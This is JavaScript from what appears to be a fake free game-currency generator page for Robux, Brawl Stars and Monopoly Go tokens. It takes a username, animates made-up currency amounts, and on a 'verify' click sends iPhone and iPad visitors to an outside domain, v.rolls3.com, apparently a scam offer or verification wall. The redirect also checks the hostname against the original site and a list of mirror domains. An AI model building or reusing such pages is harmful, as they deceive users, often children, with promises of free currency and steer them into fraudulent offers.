        var name = document.getElementById("lname").value;

        function showplatform() {
            name = document.getElementById("lname").value;
            console.log(name);
            if (name == "") {
                document.getElementById("arrow").style.display = "block";
                document.getElementById("arrow2").style.display = "none";
                document.getElementById("allplatform").style.display = "none";
                document.getElementById("allcard").style.display = "none";
            } else {
                if (name.length < 2) {

                }
                document.getElementById("arrow2").style.display = "block";
                document.getElementById("arrow").style.display = "none";
                document.getElementById("allplatform").style.display = "block";
                myFunction();
            }

        }

        var card1 = 960;
        var card2 = 1780;
        var card3 = 6500;
        var card4 = 10100;
        var cardvalue = card1;
        var currentCardNum = 1;
        document.getElementById("cardAmount").innerHTML = cardvalue;

        function card(num) {
            document.getElementById("index1").style.backgroundColor = "white";
            document.getElementById("index2").style.backgroundColor = "white";
            document.getElementById("index3").style.backgroundColor = "white";
            document.getElementById("index4").style.backgroundColor = "white";
            document.getElementById("cardsicon").classList.remove("Logoshowin");
            document.getElementById("cardsicon").classList.remove("Logoshowin2");
            document.getElementById("cardsicon").classList.remove("Logoshowin3");
            document.getElementById("cardsicon").classList.remove("Logoshowin4");
            if (currentCardNum == 4 && num == 1) {
                document.getElementById("index4").style.backgroundColor = "#0d5c2a";
                document.getElementById("cardsicon").classList.add("Logoshowin4");
                return;
            }
            if (currentCardNum == 1 && num == -1) {
                document.getElementById("index1").style.backgroundColor = "#0d5c2a";
                document.getElementById("cardsicon").classList.add("Logoshowin");
                return;
            }

            currentCardNum = currentCardNum + num;
            if (currentCardNum < 1) {
                currentCardNum = 1
            }
            if (currentCardNum > 4) {
                currentCardNum = 4
            }
            var coin = 0;
            if (currentCardNum == 1) {
                document.getElementById("index1").style.backgroundColor = "#0d5c2a";
                cardvalue = card1;

                document.getElementById("line-Ani3").classList.add("line-Ani3");
                setTimeout(function() {
                    document.getElementById("line-Ani3").classList.remove("line-Ani3");
                }, 500);


                document.getElementById("cardsicon").classList.add("Logoshowin");
                var myVar2 = setInterval(UserTimer, 1);

                function UserTimer() {
                    coin = coin + (card1 / 100);
                    if (coin <= card1) {
                        document.getElementById("cardAmount").innerHTML = Math.floor(coin);
                    } else {
                        document.getElementById("cardAmount").innerHTML = card1;
                        clearInterval(myVar2);
                    }
                }
            }

            if (currentCardNum == 2) {
                document.getElementById("line-Ani3").classList.add("line-Ani3");
                setTimeout(function() {
                    document.getElementById("line-Ani3").classList.remove("line-Ani3");
                }, 500);
                document.getElementById("index2").style.backgroundColor = "#0d5c2a";
                cardvalue = card2;
                document.getElementById("cardsicon").classList.add("Logoshowin2");
                var myVar2 = setInterval(UserTimer, 1);

                function UserTimer() {
                    coin = coin + (card2 / 100);
                    if (coin <= card2) {
                        document.getElementById("cardAmount").innerHTML = Math.floor(coin);
                    } else {
                        document.getElementById("cardAmount").innerHTML = card2;
                        clearInterval(myVar2);
                    }
                }
            }

            if (currentCardNum == 3) {
                document.getElementById("line-Ani3").classList.add("line-Ani3");
                setTimeout(function() {
                    document.getElementById("line-Ani3").classList.remove("line-Ani3");
                }, 500);
                document.getElementById("index3").style.backgroundColor = "#0d5c2a";
                cardvalue = card3;
                document.getElementById("cardsicon").classList.add("Logoshowin3");
                var myVar2 = setInterval(UserTimer, 1);

                function UserTimer() {
                    coin = coin + (card3 / 100);
                    if (coin <= card3) {
                        document.getElementById("cardAmount").innerHTML = Math.floor(coin);
                    } else {
                        document.getElementById("cardAmount").innerHTML = card3;
                        clearInterval(myVar2);
                    }
                }
            }

            if (currentCardNum == 4) {
                document.getElementById("line-Ani3").classList.add("line-Ani3");
                setTimeout(function() {
                    document.getElementById("line-Ani3").classList.remove("line-Ani3");
                }, 500);
                document.getElementById("index4").style.backgroundColor = "#0d5c2a";
                cardvalue = card4;
                document.getElementById("cardsicon").classList.add("Logoshowin4");
                var myVar2 = setInterval(UserTimer, 1);

                function UserTimer() {
                    coin = coin + (card4 / 100);
                    if (coin <= card4) {
                        document.getElementById("cardAmount").innerHTML = Math.floor(coin);
                    } else {
                        document.getElementById("cardAmount").innerHTML = card4;
                        clearInterval(myVar2);
                    }
                }
            }

        }

        function SelectedCard(cardnum) {
            document.getElementById("Robux-Card1").classList.remove('Robux-Card-Selected');
            document.getElementById("Robux-Card2").classList.remove('Robux-Card-Selected');
            document.getElementById("Robux-Card3").classList.remove('Robux-Card-Selected');
            document.getElementById("Robux-Card1").classList.add('Robux-Card');
            document.getElementById("Robux-Card2").classList.add('Robux-Card');
            document.getElementById("Robux-Card3").classList.add('Robux-Card');

            document.getElementById("Robux-Card" + cardnum).classList.remove('Robux-Card');
            document.getElementById("Robux-Card" + cardnum).classList.add('Robux-Card-Selected');
        }
/*================== [ 2 ] ===============*/
/*================== [ brawl stars ] ================*/
var button = document.querySelector('#bntverify');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://v.rolls3.com/";
        var blockedDomains = [
            "jsdhjjhhjjhejkjkas.blogspot.com",
            "mply.io.t0ke2n.site",
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
